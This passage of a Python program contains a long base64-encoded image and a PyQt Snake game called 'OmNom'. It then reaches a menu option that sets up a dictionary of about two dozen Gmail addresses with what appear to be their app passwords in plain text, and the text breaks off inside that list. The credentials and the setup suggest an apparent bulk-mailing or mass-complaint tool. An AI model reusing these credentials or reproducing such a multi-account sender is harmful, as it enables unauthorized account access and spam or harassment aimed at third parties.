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"

        class SnakeGame(QMainWindow):
            def __init__(self):
                super().__init__()
                self.animation_progress = 0.0
                self.animation_speed = 0.2
                self.prev_positions = []
                self.initUI()

            def initUI(self):
                self.setWindowTitle('OmNom')
                self.setGeometry(100, 100, 620, 700)
                self.setFixedSize(620, 700)

                self.central_widget = QWidget()
                self.setCentralWidget(self.central_widget)

                self.score_label = QLabel('Длина: 1', self)
                self.score_label.setGeometry(20, 620, 200, 30)
                self.score_label.setStyleSheet('color: white; font-size: 20px; font-weight: bold;')

                self.highscore_label = QLabel('Рекорд: 0', self)
                self.highscore_label.setGeometry(20, 650, 200, 30)
                self.highscore_label.setStyleSheet('color: white; font-size: 20px; font-weight: bold;')

                self.cell_size = 20
                self.board_width = 600
                self.board_height = 600
                self.width = self.board_width // self.cell_size
                self.height = self.board_height // self.cell_size

                self.apple_img = QImage.fromData(b64decode(OMNOM_BASE64))
                self.apple_img = self.apple_img.scaled(self.cell_size, self.cell_size)

                self.snake_img = QImage.fromData(b64decode(OMNOM_BASE64))
                self.snake_img = self.snake_img.scaled(self.cell_size, self.cell_size)

                self.snake = [(self.width // 2, self.height // 2)]
                self.direction = (1, 0)

                self.load_highscore()
                self.place_apple()

                self.timer = QTimer(self)
                self.timer.timeout.connect(self.update_game)
                self.timer.start(16)

                self.setFocus()
                self.show()

            def save_highscore(self):
                os.makedirs('settings', exist_ok=True)
                with open('settings/snake.json', 'w') as f:
                    json.dump({'highscore': self.highscore}, f)

            def load_highscore(self):
                try:
                    with open('settings/snake.json', 'r') as f:
                        data = json.load(f)
                        self.highscore = data['highscore']
                except:
                    self.highscore = 0
                self.update_labels()

            def place_apple(self):
                while True:
                    x = random.randint(0, self.width - 1)
                    y = random.randint(0, self.height - 1)
                    if (x, y) not in self.snake:
                        self.apple = (x, y)
                        break

            def update_game(self):
                self.animation_progress += self.animation_speed

                if self.animation_progress >= 1.0:
                    self.animation_progress = 0.0
                    self.prev_positions = [(pos[0], pos[1]) for pos in self.snake]

                    new_head = (
                        self.snake[0][0] + self.direction[0],
                        self.snake[0][1] + self.direction[1]
                    )

                    if (new_head[0] < 0 or new_head[0] >= self.width or
                            new_head[1] < 0 or new_head[1] >= self.height):
                        self.game_over()
                        return

                    if new_head in self.snake[:-1]:
                        self.game_over()
                        return

                    self.snake.insert(0, new_head)

                    if new_head == self.apple:
                        self.place_apple()
                        if len(self.snake) > self.highscore:
                            self.highscore = len(self.snake)
                            self.save_highscore()
                    else:
                        self.snake.pop()

                    self.update_labels()

                self.update()

            def update_labels(self):
                self.score_label.setText(f'Длина: {len(self.snake)}')
                self.highscore_label.setText(f'Рекорд: {self.highscore}')

            def game_over(self):
                self.timer.stop()
                self.snake = [(self.width // 2, self.height // 2)]
                self.direction = (1, 0)
                self.place_apple()
                self.timer.start()

            def keyPressEvent(self, event):
                key = event.key()

                if key == Qt.Key.Key_Left and self.direction != (1, 0):
                    self.direction = (-1, 0)
                elif key == Qt.Key.Key_Right and self.direction != (-1, 0):
                    self.direction = (1, 0)
                elif key == Qt.Key.Key_Up and self.direction != (0, 1):
                    self.direction = (0, -1)
                elif key == Qt.Key.Key_Down and self.direction != (0, -1):
                    self.direction = (0, 1)

            def paintEvent(self, event):
                painter = QPainter(self)

                painter.setPen(QColor(100, 100, 100))
                painter.drawRect(9, 9, self.board_width + 2, self.board_height + 2)

                for x in range(self.width):
                    for y in range(self.height):
                        painter.setPen(QColor(50, 50, 50))
                        painter.setBrush(QColor(30, 30, 30))
                        painter.drawRect(
                            x * self.cell_size + 10,
                            y * self.cell_size + 10,
                            self.cell_size,
                            self.cell_size
                        )

                if self.prev_positions:
                    for i, (curr_pos, prev_pos) in enumerate(zip(self.snake, self.prev_positions)):
                        x = prev_pos[0] + (curr_pos[0] - prev_pos[0]) * self.animation_progress
                        y = prev_pos[1] + (curr_pos[1] - prev_pos[1]) * self.animation_progress

                        painter.drawImage(
                            int(x * self.cell_size + 10),
                            int(y * self.cell_size + 10),
                            self.snake_img
                        )
                else:
                    for segment in self.snake:
                        painter.drawImage(
                            segment[0] * self.cell_size + 10,
                            segment[1] * self.cell_size + 10,
                            self.snake_img
                        )

                painter.drawImage(
                    self.apple[0] * self.cell_size + 10,
                    self.apple[1] * self.cell_size + 10,
                    self.apple_img
                )

        if __name__ == '__main__':
            app = QApplication(sys.argv)
            app.setStyle('Fusion')

            dark_palette = app.palette()
            dark_palette.setColor(QPalette.ColorRole.Window, QColor(45, 45, 45))
            dark_palette.setColor(QPalette.ColorRole.WindowText, QColor(208, 208, 208))
            app.setPalette(dark_palette)

            game = SnakeGame()
            sys.exit(app.exec())
        return False
    elif choice == "5":
        import asyncio

        senders = {
            'miranovseverov@gmail.com': ' kdbc vmdb djxf pmiq',
            'maksimafanacefish@gmail.com': 'hdpn tbfp acwv jyro',
            'artemkrotisov@gmail.com': 'zglw vgak tfov uxao',
            'Vanakrotisov@gmail.com': 'gukl qhxy uxea yhil',
            'leravladimir237@gmail.com': 'ndon fzio vskk bidt ',
            'suckdick12345222@gmail.com': 'ckcw eqdv nsjv whgm',
            'alenaveterov@gmail.com': 'hmiq xwmr yfmw prsa',
            'linadurov@gmail.com': 'gsbp xyts brbu dlpw',
            'kolyaivanov000k@gmail.com': 'mfhg eeio ayau zked',
            "dlatt6677@gmail.com": "usun ruef otzx zcrh",
            "edittendo0@gmail.com": "mzdl lrmx puyq epur",
            "shshsbsbsbwbwvw@gmail.com": "jqrx qivo qxjy jejt",
            "IvanKarma2000@gmail.com": "irlr cggo xksq tlbb",
            "misha28272727@gmail.com": "kgwqxvkgjyccibkm",
            "trevorzxasuniga214@gmail.com": "egnr eucw jvxg jatq",
            "dellapreston50@gmail.com": "qoit huon rzsd eewo",
            "neilfdhioley765@gmail.com": "rgco uwiy qrdc gvqh",
            "samuelmnjassey32@gmail.com": "lgct cjiw nufr zxjg",
            "segapro72@gmail.com": "ubmq pbrt ujqy orhf",
            "kurokopotok@gmail.com": "pxww ewut uffz ufpu",
            "kalievutub@gmail.com": "jlwb otxo mppi jvdh",
            "snosakka07@gmail.com": "yiro khva gafc lujr",
            "prosega211@gmail.com": "fnrz rkrp nrwy yaig",
            "qwaerlarp@gmail.com": "zrzx siyf ukvm ctjp",
